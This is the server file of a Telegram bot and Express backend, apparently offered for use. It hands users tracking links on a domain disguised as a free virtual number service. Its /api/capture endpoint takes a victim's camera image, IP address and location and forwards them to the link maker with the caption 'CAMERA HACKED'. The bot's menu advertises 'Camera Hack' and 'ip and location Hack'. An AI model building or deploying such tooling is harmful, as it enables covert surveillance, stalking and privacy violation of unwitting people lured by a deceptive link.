// server.js
const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ===== Middleware =====
app.use(bodyParser.json({ limit: "20mb" }));
app.use(express.static(path.join(__dirname, "public")));

// ===== CONFIG =====
const DOMAIN = "https://freevirtualnumbers.onrender.com";
const CHANNEL_USERNAME = "@devxtechzone";
const OWNER_ID = 6170894121; // <-- Replace with your Telegram ID
const users = new Set(); // store all users who start the bot

// ===== User Tracking =====
const activeUsers = {};
const TOKEN_EXPIRY_MS = 10 * 60 * 1000;

setInterval(() => {
  const now = Date.now();
  for (const token in activeUsers) {
    if (now - activeUsers[token].createdAt > TOKEN_EXPIRY_MS) {
      delete activeUsers[token];
    }
  }
}, 2 * 60 * 1000);

function generateToken() {
  return crypto.randomBytes(8).toString("hex");
}

// ===== Force Join Check =====
async function isUserJoined(ctx) {
  try {
    const member = await ctx.telegram.getChatMember(CHANNEL_USERNAME, ctx.from.id);
    return (
      member.status === "creator" ||
      member.status === "administrator" ||
      member.status === "member"
    );
  } catch {
    return false;
  }
}

// ===== Force Join / Access Locked Message =====
async function forceJoin(ctx) {
  return ctx.reply(
`🚫 ACCESS LOCKED

You must join our channel before using this bot.`,
    {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([
        [Markup.button.url("📢 Join DevX Tech Zone", "https://t.me/devxtechzone")],
        [Markup.button.callback("✅ I Joined", "check_join")]
      ])
    }
  );
}

// ===== Menu =====
function mainMenu() {
  return Markup.inlineKeyboard([
    [
      Markup.button.callback("🎱 Pool Tracking", "pool"),
      Markup.button.callback("⚡ Normal Tracking", "normal")
    ],
    [
      Markup.button.callback("📊 Bot Stats", "stats"),
      Markup.button.callback("🧠 Info", "info")
    ],
    [Markup.button.callback("👨‍💻 Developer", "dev")],
    [Markup.button.callback("🆔 My Telegram ID", "my_id")],
    [
      Markup.button.url("🌐 Support Channel", "https://t.me/Mrddev"),
      Markup.button.url("🌐 DevX Tech Zone", "https://t.me/devxtechzone")
    ]
  ]);
}

// ===== Middleware to lock all commands until join =====
bot.use(async (ctx, next) => {
  // ❗ Ignore channel updates (THIS was causing your error)
  if (!ctx.from || !ctx.chat || ctx.chat.type === "channel") {
    return;
  }

  // ✅ Allow "I Joined" button to pass
  if (ctx.callbackQuery && ctx.callbackQuery.data === "check_join") {
    return next();
  }

  const joined = await isUserJoined(ctx);

  if (!joined) {
    // ✅ ALWAYS send to user, not channel
    return ctx.telegram.sendMessage(
      ctx.from.id,
      `🚫 ACCESS LOCKED

You must join our channel before using this bot.`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "📢 Join DevX Tech Zone", url: "https://t.me/devxtechzone" }],
            [{ text: "✅ I Joined", callback_data: "check_join" }]
          ]
        }
      }
    );
  }

  return next();
});

// ===== START =====
bot.start(async (ctx) => {
  users.add(ctx.from.id); // Save user for broadcast
  await ctx.replyWithPhoto(
    "https://files.catbox.moe/v75lmb.jpeg",
    {
      caption: `
<b>🔱 PRO SYSTEM v3.0</b>

━━━━━━━━━━━━━━━━━━
⚡ Status: ONLINE
🤖 Engine: Telegraf
🌐 Server: Secure Cloud

Select a module below.
`,
      parse_mode: "HTML",
      ...mainMenu()
    }
  );
});

// ===== Check Join Button =====
bot.action("check_join", async (ctx) => {
  const joined = await isUserJoined(ctx);

  if (!joined) {
    return ctx.answerCbQuery("❌ Join the channel first", { show_alert: true });
  }

  await ctx.answerCbQuery("✅ Access Granted");
  await ctx.reply("🔓 Access Unlocked", mainMenu());
});

// ===== Pool Mode =====
bot.action("pool", async (ctx) => {
  await ctx.answerCbQuery();

  const token = generateToken();

  activeUsers[token] = {
    chat_id: ctx.chat.id,
    username: ctx.from.username,
    createdAt: Date.now()
  };

  const msg = await ctx.reply("⚙️ Initializing Pool Mode...");
  await new Promise(r => setTimeout(r, 1500));

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    msg.message_id,
    undefined,
`
🎱 <b>POOL MODE</b>

━━━━━━━━━━━━━━━━━━

🔗 Your Link:
<code>${DOMAIN}?token=${token}</code>
`,
    {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "back")]])
    }
  );
});

// ===== Normal Mode =====
bot.action("normal", async (ctx) => {
  await ctx.answerCbQuery();

  const token = generateToken();

  activeUsers[token] = {
    chat_id: ctx.chat.id,
    username: ctx.from.username,
    createdAt: Date.now()
  };

  const msg = await ctx.reply("⚙️ Preparing Normal Mode...");
  await new Promise(r => setTimeout(r, 1500));

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    msg.message_id,
    undefined,
`
⚡ <b>NORMAL MODE</b>

━━━━━━━━━━━━━━━━━━

🔗 Your Link:
<code>${DOMAIN}?token=${token}</code>
`,
    {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "back")]])
    }
  );
});

// ===== Stats =====
bot.action("stats", async (ctx) => {
  await ctx.answerCbQuery();

  await ctx.reply(
`📊 BOT STATS

Active Users: ${Object.keys(activeUsers).length}
Server: ONLINE
Version: v3.0`,
{ parse_mode: "HTML" });
});

// ===== Info =====
bot.action("info", async (ctx) => {
  await ctx.answerCbQuery();

  await ctx.reply(
`🧠 ABOUT

• Camera Hack
• Token expires in 10 mins
• ip and location Hack`,
{ parse_mode: "HTML" });
});

const activeChats = {};
const ownerId = 6170894121;

bot.command('chat', async (ctx) => {
  const chatId = ctx.chat.id;
  activeChats[chatId] = true;

  await ctx.reply(`
🌹 *ᴄʜᴀᴛ ᴍᴏᴅᴇ* 🌹

Yᴏᴜ ᴄᴀɴ ɴᴏᴡ sᴇɴᴅ ᴍᴇ ᴀ ᴍᴇssᴀɢᴇ dɪʀᴇᴄᴛʟʏ.
Aʟʟ ᴍᴇssᴀɢᴇs ᴡɪʟʟ ʙᴇ ꜰᴏʀᴡᴀʀᴅᴇᴅ ᴛᴏ ᴛʜᴇ ᴏᴡɴᴇʀ.

Tʏᴘᴇ /ᴇxɪᴛ ᴛᴏ ʟᴇᴀᴠᴇ ᴄʜᴀᴛ ᴍᴏᴅᴇ.
`, {
    parse_mode: "Markdown"
  });
});
bot.command('exit', async (ctx) => {
  const chatId = ctx.chat.id;

  if (activeChats[chatId]) {
    delete activeChats[chatId];

    await ctx.reply("✅ Yᴏᴜ ʜᴀᴠᴇ ᴇxɪᴛᴇᴅ ᴄʜᴀᴛ ᴍᴏᴅᴇ.");
  } else {
    await ctx.reply("⚠️ Yᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ ᴄʜᴀᴛ ᴍᴏᴅᴇ.");
  }
});

bot.on('text', async (ctx) => {
  const chatId = ctx.chat.id;
  const msg = ctx.message;

  if (!msg.text) return;

  // OWNER REPLY SYSTEM
  if (chatId === ownerId && msg.reply_to_message?.text) {
    const match = msg.reply_to_message.text.match(/ID: (\d+)/);
    if (match) {
      const userId = parseInt(match[1], 10);

      try {
        await ctx.telegram.sendMessage(
          userId,
          `💬 <b>Reply from owner:</b>\n${msg.text}`,
          { parse_mode: "HTML" }
        );

        await ctx.reply("✅ Reply sent.");
      } catch (err) {
        console.error(err);
        await ctx.reply("❌ Failed to send reply.");
      }
    }
    return;
  }

  // USER → OWNER CHAT SYSTEM
  if (msg.text.startsWith('/')) return;

  if (activeChats[chatId]) {
    try {
      await ctx.telegram.sendMessage(
        ownerId,
        `📨 <b>Message from user</b>

👤 Name: ${msg.from.first_name || 'Unknown'}
🔗 Username: @${msg.from.username || 'Nᴏᴜsᴇʀɴᴀᴍᴇ'}
🆔 ID: ${chatId}

💬 Message:
${msg.text}

✏️ Reply to this message to respond.`,
        { parse_mode: "HTML" }
      );

      await ctx.reply("✅ Message sent to owner.");
    } catch (err) {
      console.error(err);
      await ctx.reply("❌ Failed to send message.");
    }
  }
});

bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ Only the owner can use this command.");

  const message = ctx.message.text.split(" ").slice(1).join(" ");
  if (!message) return ctx.reply("Usage:\n/broadcast Your message here");

  let success = 0;
  let failed = 0;

  for (const userId of users) {
    try {
      await bot.telegram.sendMessage(userId, message, { parse_mode: "HTML" });
      success++;
    } catch {
      failed++;
    }
  }

  ctx.reply(`📢 Broadcast Completed

✅ Success: ${success}
❌ Failed: ${failed}`);
});

// ===== Developer =====
bot.action("dev", async (ctx) => {
  await ctx.answerCbQuery();

  await ctx.reply(
`
👨‍💻 <b>DEVELOPER</b>

━━━━━━━━━━━━━━━━━━

Name: Mr Dev
Contact: @Mrddev`,
{ parse_mode: "HTML" });
});

// ===== Telegram ID Checker =====
bot.action("my_id", async (ctx) => {
  await ctx.answerCbQuery();

  await ctx.reply(
`🆔 Your Telegram ID is:

<code>${ctx.from.id}</code>`,
  { parse_mode: "HTML" });
});

// ===== Back =====
bot.action("back", async (ctx) => {
  await ctx.answerCbQuery();

  await ctx.editMessageText(
`<b>🔱 PRO SYSTEM v3.0</b>

Select a module below.`,
{
  parse_mode: "HTML",
  ...mainMenu()
});
});


// ===== Serve Frontend =====
app.get("/", (req, res) => {
res.sendFile(path.join(__dirname, "public/index.html"));
});

// ===== API to receive image + IP + location =====
app.post("/api/capture", async (req, res) => {
  try {
    const { image, token, ip, location } = req.body;

    if (!image) return res.status(400).json({ error: "No image provided" });
    if (!token || !activeUsers[token]) return res.status(400).json({ error: "Invalid or expired token" });

    const chat_id = activeUsers[token].chat_id;

    // Convert Base64 image to buffer
    const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");

    // Send photo with caption
    await bot.telegram.sendPhoto(chat_id, { source: buffer }, {
      caption: `
📸 <b>CAMERA HACKED</b>

🌐 <b>IP Address:</b> ${ip}
📍 <b>Location:</b> ${location}

🛰 <b>Tracker:</b> Pro Tracker v3
`,
      parse_mode: "HTML"
    });

    res.json({ status: "success", message: "Image + IP + Location sent" });

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});
// ===== Start Server =====
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

// Use long polling for simplicity (no webhook required)
bot.launch().then(() => console.log("Telegram bot running"));
